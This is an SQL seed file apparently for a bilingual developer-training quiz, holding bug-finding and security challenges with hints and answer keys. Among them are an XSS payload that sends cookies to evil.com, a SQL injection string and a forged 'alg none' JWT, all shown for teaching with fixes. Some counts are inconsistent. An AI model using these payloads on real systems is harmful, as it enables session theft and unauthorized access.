-- ═══════════════════════════════════════════════════════
-- Wrench Challenges — Seed Data (20 challenges)
-- ═══════════════════════════════════════════════════════

INSERT INTO challenges (role, difficulty, type, title, title_ru, description, description_ru, input_data, hint, hint_ru, correct_answer, answer_type, explanation, explanation_ru, points) VALUES

-- ── QA Challenges ──────────────────────────────────────

('qa', 'easy', 'find_bug', 
 'Find the JSON bug',
 'Найди баг в JSON',
 'This API response is causing a 500 error. Find the syntax error.',
 'Этот API-ответ вызывает ошибку 500. Найди синтаксическую ошибку.',
 '{"user": {"id": 123, "name": "Alice", "email": "alice@example.com", "roles": ["admin", "user",], "active": true}}',
 'Look carefully at the arrays and commas.',
 'Внимательно посмотри на массивы и запятые.',
 'trailing comma',
 'contains',
 'The array ["admin", "user",] has a trailing comma before the closing bracket. JSON does not allow trailing commas.',
 'Массив ["admin", "user",] содержит лишнюю запятую перед закрывающей скобкой. JSON не допускает trailing comma.',
 10),

('qa', 'medium', 'find_bug',
 'Broken JWT payload',
 'Сломанный JWT payload',
 'A user reports they cannot access admin features despite having the admin role. Decode this JWT and find the issue.',
 'Пользователь сообщает, что не может получить доступ к функциям администратора. Декодируй JWT и найди проблему.',
 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNjAwMDAwMDAwfQ.signature',
 'Check the expiration field in the payload.',
 'Проверь поле истечения срока в payload.',
 'expired',
 'contains',
 'The exp field is 1600000000 (September 2020). This JWT expired years ago. The user has the correct role, but the token itself is expired.',
 'Поле exp равно 1600000000 (сентябрь 2020). JWT давно истёк. У пользователя правильная роль, но токен недействителен.',
 20),

('qa', 'easy', 'write_regex',
 'Email validation regex',
 'Regex для валидации email',
 'Write a regex pattern that matches valid email addresses. It must match: user@example.com, alice.bob@company.org. It must NOT match: notanemail, @nodomain.com, user@',
 'Напиши regex паттерн для валидации email. Должен совпадать: user@example.com, alice.bob@company.org. Не должен: notanemail, @nodomain.com, user@',
 'Test strings:\n✓ user@example.com\n✓ alice.bob@company.org\n✓ test+tag@mail.co.uk\n✗ notanemail\n✗ @nodomain.com\n✗ user@\n✗ user @example.com',
 'A valid email has local@domain.tld structure.',
 'Валидный email имеет структуру local@domain.tld.',
 '^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$',
 'contains',
 'The pattern ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$ covers the required cases. The local part allows letters, numbers and special chars. Domain must have a dot with 2+ letter TLD.',
 'Паттерн ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$ покрывает все случаи. Локальная часть допускает буквы, цифры и спецсимволы. Домен должен содержать точку с TLD минимум 2 символа.',
 15),

('qa', 'medium', 'test_cases',
 'Write test cases: login form',
 'Тест-кейсы: форма входа',
 'A login form has: email field, password field (min 8 chars), "Remember me" checkbox. After 5 failed attempts, account is locked for 15 minutes. List the most important test cases (write at least 5 categories).',
 'Форма входа содержит: поле email, поле пароля (мин. 8 символов), чекбокс "Запомнить меня". После 5 неудачных попыток аккаунт блокируется на 15 минут. Перечисли самые важные тест-кейсы (минимум 5 категорий).',
 'Login Form Requirements:\n- Email: required, must be valid format\n- Password: required, minimum 8 characters\n- Remember me: optional checkbox\n- 5 failed attempts → 15 min lockout\n- Success → redirect to dashboard',
 'Think about: happy path, validation, security, edge cases, UX.',
 'Подумай о: happy path, валидация, безопасность, edge cases, UX.',
 'lockout',
 'contains',
 'Key test cases: 1) Happy path (valid credentials), 2) Empty fields, 3) Invalid email format, 4) Password too short (<8 chars), 5) Wrong password, 6) Account lockout after 5 attempts, 7) Lockout timer resets, 8) Remember me persists session, 9) SQL injection in email field, 10) Redirect after login.',
 'Ключевые тест-кейсы: 1) Happy path (верные данные), 2) Пустые поля, 3) Неверный формат email, 4) Пароль короче 8 символов, 5) Неверный пароль, 6) Блокировка после 5 попыток, 7) Сброс таймера блокировки, 8) Remember me сохраняет сессию, 9) SQL-инъекция в поле email, 10) Редирект после входа.',
 25),

('qa', 'hard', 'api_analysis',
 'Find all issues in this API response',
 'Найди все проблемы в API-ответе',
 'This REST API response has multiple issues. Find as many as you can.',
 'Этот REST API-ответ содержит несколько проблем. Найди как можно больше.',
 'HTTP/1.1 200 OK
Content-Type: text/html
X-Powered-By: Express 4.17.1

{
  "status": "success",
  "data": {
    "user_id": "123",
    "password": "hashed_p@ssw0rd",
    "credit_card": "4532-1234-5678-9012",
    "ssn": "123-45-6789",
    "token": "eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.",
    "created": "13/08/2024"
  },
  "error": null
}',
 'Check: HTTP status, headers, sensitive data, JWT algorithm, date format.',
 'Проверь: HTTP-статус, заголовки, чувствительные данные, алгоритм JWT, формат даты.',
 'password',
 'contains',
 '5 issues: 1) Wrong Content-Type (should be application/json), 2) Password exposed in response, 3) Credit card number exposed, 4) SSN exposed, 5) JWT uses "none" algorithm (no signature = security bypass), 6) Date format inconsistent (should be ISO 8601), 7) X-Powered-By header reveals stack.',
 '5 проблем: 1) Неверный Content-Type (должен быть application/json), 2) Пароль в ответе, 3) Номер карты в ответе, 4) SSN в ответе, 5) JWT с алгоритмом "none" (нет подписи = обход безопасности), 6) Непоследовательный формат даты (должен быть ISO 8601), 7) Заголовок X-Powered-By раскрывает стек.',
 40),

-- ── Frontend Challenges ────────────────────────────────

('frontend', 'easy', 'find_bug',
 'Fix the broken JSON config',
 'Исправь сломанный JSON конфиг',
 'This Next.js config file is throwing a parse error. Find and fix the syntax error.',
 'Этот конфиг Next.js выдаёт ошибку парсинга. Найди и исправь синтаксическую ошибку.',
 '{
  "compilerOptions": {
    "target": "ES2017",
    "module": "commonjs"
    "strict": true,
    "outDir": "./dist",
    "rootDir": "./src"
  },
  "include": ["src/**/*"]
}',
 'Look at each line ending.',
 'Посмотри на концы каждой строки.',
 'missing comma',
 'contains',
 'After "module": "commonjs" there is a missing comma. JSON requires commas between all key-value pairs except the last one.',
 'После "module": "commonjs" пропущена запятая. JSON требует запятые между парами ключ-значение, кроме последней.',
 10),

('frontend', 'medium', 'decode',
 'Decode this Base64 token',
 'Декодируй Base64 токен',
 'A frontend app is sending this value in the Authorization header. What does it contain? Is there a security issue?',
 'Фронтенд-приложение отправляет это значение в заголовке Authorization. Что это содержит? Есть ли проблема безопасности?',
 'Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=',
 'Basic auth uses base64 encoding (not encryption).',
 'Basic auth использует base64-кодирование (не шифрование).',
 'admin:password123',
 'contains',
 'The value decodes to "admin:password123". Basic Auth uses base64 encoding which is trivially reversible — not encryption. Never use Basic Auth over HTTP. Over HTTPS it''s acceptable but credentials should still be strong.',
 'Значение декодируется в "admin:password123". Basic Auth использует base64, который легко обратим — это не шифрование. Никогда не использовать Basic Auth по HTTP. По HTTPS приемлемо, но пароли должны быть надёжными.',
 20),

('frontend', 'easy', 'find_bug',
 'CSS Selector bug',
 'Баг в CSS-селекторе',
 'This CSS selector is supposed to select all error messages inside a form, but it is not working. Find the issue.',
 'Этот CSS-селектор должен выбирать все сообщения об ошибках внутри формы, но не работает. Найди проблему.',
 'Selector: form > .error-message
HTML:
<form>
  <div class="field-wrapper">
    <span class="error-message">Email is required</span>
  </div>
  <div class="field-wrapper">
    <span class="error-message">Password too short</span>
  </div>
</form>',
 'The > combinator means direct child only.',
 'Комбинатор > означает только прямого потомка.',
 'direct child',
 'contains',
 'The > combinator selects only direct children. The .error-message spans are children of .field-wrapper, not direct children of form. Use "form .error-message" (descendant selector) instead.',
 'Комбинатор > выбирает только прямых потомков. Элементы .error-message являются детьми .field-wrapper, а не прямыми детьми form. Нужно использовать "form .error-message" (селектор потомков).',
 10),

('frontend', 'hard', 'find_bug',
 'Find the XSS vulnerability',
 'Найди XSS-уязвимость',
 'This React component renders user-provided content. Find the security vulnerability and explain how to fix it.',
 'Этот React-компонент рендерит пользовательский контент. Найди уязвимость безопасности и объясни как исправить.',
 'function UserComment({ comment }) {
  return (
    <div className="comment">
      <div dangerouslySetInnerHTML={{ __html: comment.text }} />
      <span>{comment.author}</span>
    </div>
  );
}

// comment.text could be:
// "<script>fetch(''https://evil.com?c=''+document.cookie)</script>"',
 'How does React normally prevent XSS? What does dangerouslySetInnerHTML bypass?',
 'Как React обычно предотвращает XSS? Что обходит dangerouslySetInnerHTML?',
 'dangerouslySetInnerHTML',
 'contains',
 'dangerouslySetInnerHTML bypasses React''s automatic XSS protection. Malicious users can inject <script> tags or event handlers. Fix: use a library like DOMPurify to sanitize HTML before rendering, or convert HTML to markdown and use a safe renderer.',
 'dangerouslySetInnerHTML обходит автоматическую XSS-защиту React. Злоумышленники могут внедрить теги <script> или обработчики событий. Исправление: использовать DOMPurify для санитизации HTML перед рендерингом.',
 40),

-- ── Backend Challenges ─────────────────────────────────

('backend', 'easy', 'find_bug',
 'Fix the HTTP status code',
 'Исправь HTTP-статус код',
 'This API endpoint returns the wrong HTTP status code. What should it return instead and why?',
 'Этот API-эндпоинт возвращает неправильный HTTP-статус код. Какой должен возвращать и почему?',
 'POST /api/users
Request: { "email": "alice@example.com", "name": "Alice" }

Response: HTTP 200 OK
{ "id": "uuid-123", "email": "alice@example.com", "name": "Alice", "created_at": "2024-01-01" }',
 'What status code is specifically designed for successful resource creation?',
 'Какой статус-код специально предназначен для успешного создания ресурса?',
 '201',
 'contains',
 'POST requests that create a new resource should return 201 Created, not 200 OK. Additionally, the response should include a Location header pointing to the new resource: Location: /api/users/uuid-123.',
 'POST-запросы, создающие новый ресурс, должны возвращать 201 Created, а не 200 OK. Дополнительно ответ должен содержать заголовок Location: /api/users/uuid-123.',
 10),

('backend', 'medium', 'api_analysis',
 'Find the security issues in this endpoint',
 'Найди уязвимости в этом эндпоинте',
 'Review this API endpoint implementation and find all security issues.',
 'Проверь реализацию этого API-эндпоинта и найди все уязвимости.',
 'GET /api/users?id=123&debug=true

Response:
{
  "user": {
    "id": 123,
    "email": "alice@example.com",
    "password_hash": "$2b$10$abc123...",
    "api_key": "sk-prod-abc123xyz"
  },
  "debug": {
    "query": "SELECT * FROM users WHERE id = 123",
    "db_host": "prod-db.internal.company.com",
    "execution_time_ms": 45
  }
}',
 'Count the issues: exposed data, debug info, SQL visibility.',
 'Посчитай проблемы: открытые данные, debug-информация, видимость SQL.',
 'password',
 'contains',
 '5 issues: 1) password_hash exposed (never return hashes), 2) api_key exposed (critical - rotate immediately), 3) debug parameter enabled in prod, 4) SQL query exposed (reveals schema), 5) Internal DB hostname exposed. Fix: never expose sensitive fields, disable debug in prod, use field allowlists.',
 '5 проблем: 1) password_hash в ответе (никогда не возвращать хэши), 2) api_key в ответе (критично - ротировать немедленно), 3) debug параметр в проде, 4) SQL-запрос раскрывает схему БД, 5) Внутренний hostname базы. Исправление: не возвращать чувствительные поля, отключить debug в проде.',
 30),

('backend', 'hard', 'find_bug',
 'JWT "none" algorithm attack',
 'Атака JWT с алгоритмом "none"',
 'A security researcher found that this API accepts modified JWTs. Decode this token and explain the attack.',
 'Исследователь безопасности обнаружил, что этот API принимает модифицированные JWT. Декодируй токен и объясни атаку.',
 'Original token (signed with HS256):
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoidXNlciJ9.signature

Attacker modified token:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.',
 'Decode the header of the second token. What algorithm does it specify?',
 'Декодируй заголовок второго токена. Какой алгоритм он указывает?',
 'none',
 'contains',
 'This is the JWT "alg:none" attack. The attacker changed the algorithm to "none" and the role to "admin". If the server accepts "none" algorithm, it skips signature verification entirely. Fix: always explicitly specify and validate the expected algorithm. Never accept "none".',
 'Это атака JWT "alg:none". Злоумышленник изменил алгоритм на "none" и роль на "admin". Если сервер принимает алгоритм "none", он полностью пропускает проверку подписи. Исправление: всегда явно указывать и проверять ожидаемый алгоритм. Никогда не принимать "none".',
 50),

('backend', 'medium', 'sql_fix',
 'Find the SQL injection',
 'Найди SQL-инъекцию',
 'This backend code has a critical SQL injection vulnerability. Find it and explain how to fix it.',
 'Этот backend-код содержит критическую SQL-инъекцию. Найди её и объясни как исправить.',
 'app.get("/api/products", (req, res) => {
  const category = req.query.category;
  const query = `SELECT * FROM products WHERE category = ''${category}'' AND active = true`;
  
  db.query(query, (err, results) => {
    res.json(results);
  });
});

// Attacker request:
// GET /api/products?category='' OR 1=1--',
 'What happens when the attacker input is directly inserted into the SQL string?',
 'Что произойдёт, если ввод злоумышленника напрямую вставить в SQL-строку?',
 'parameterized',
 'contains',
 'String interpolation in SQL queries allows injection. The attacker''s input '' OR 1=1-- closes the string, adds a condition that is always true (returning all rows), and comments out the rest. Fix: use parameterized queries: db.query("SELECT * FROM products WHERE category = ? AND active = true", [category])',
 'Интерполяция строк в SQL-запросах допускает инъекцию. Ввод злоумышленника '' OR 1=1-- закрывает строку, добавляет всегда истинное условие и комментирует остаток. Исправление: использовать параметризованные запросы: db.query("SELECT * FROM products WHERE category = ? AND active = true", [category])',
 30),

-- More QA challenges
('qa', 'medium', 'write_regex',
 'UUID v4 regex',
 'Regex для UUID v4',
 'Write a regex that validates UUID v4 format. Example: 550e8400-e29b-41d4-a716-446655440000',
 'Напиши regex для валидации UUID v4. Пример: 550e8400-e29b-41d4-a716-446655440000',
 'Must match:\n✓ 550e8400-e29b-41d4-a716-446655440000\n✓ 6ba7b810-9dad-41d1-80b4-00c04fd430c8\n✓ A987FBC9-4BED-4078-8141-AABBCCDDEEFF\n\nMust NOT match:\n✗ not-a-uuid\n✗ 550e8400e29b41d4a716446655440000\n✗ 550e8400-e29b-41d4-a716',
 'UUID has 5 groups: 8-4-4-4-12 hex characters.',
 'UUID имеет 5 групп: 8-4-4-4-12 hex символов.',
 '[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
 'contains',
 'UUID v4 format: 8 hex chars - 4 hex chars - 4 hex chars - 4 hex chars - 12 hex chars. The pattern [0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12} covers case-insensitive matching.',
 'Формат UUID v4: 8 hex - 4 hex - 4 hex - 4 hex - 12 hex. Паттерн [0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12} покрывает case-insensitive совпадение.',
 20),

('qa', 'easy', 'find_bug',
 'HTTP method mismatch',
 'Несоответствие HTTP-метода',
 'A developer says "the delete endpoint is not working". Look at the API call and find the bug.',
 'Разработчик говорит "эндпоинт удаления не работает". Посмотри на API-вызов и найди баг.',
 'API Documentation:
DELETE /api/users/{id} — Delete a user

Frontend code:
fetch("/api/users/123", {
  method: "POST",
  headers: { "Authorization": "Bearer token123" }
})',
 'Compare the HTTP method in the docs vs the code.',
 'Сравни HTTP-метод в документации и в коде.',
 'DELETE',
 'contains',
 'The API documentation specifies DELETE method, but the code uses POST. This will hit the wrong route handler. Change method: "POST" to method: "DELETE".',
 'API-документация указывает метод DELETE, но код использует POST. Это попадёт в неправильный обработчик маршрута. Нужно изменить method: "POST" на method: "DELETE".',
 10);

-- ── Schedule first daily challenges ─────────────────────
INSERT INTO daily_challenges (challenge_id, role, scheduled_for)
SELECT id, 'qa',       CURRENT_DATE FROM challenges WHERE role = 'qa'       AND difficulty = 'easy' LIMIT 1;
INSERT INTO daily_challenges (challenge_id, role, scheduled_for)
SELECT id, 'frontend', CURRENT_DATE FROM challenges WHERE role = 'frontend' AND difficulty = 'easy' LIMIT 1;
INSERT INTO daily_challenges (challenge_id, role, scheduled_for)
SELECT id, 'backend',  CURRENT_DATE FROM challenges WHERE role = 'backend'  AND difficulty = 'easy' LIMIT 1;
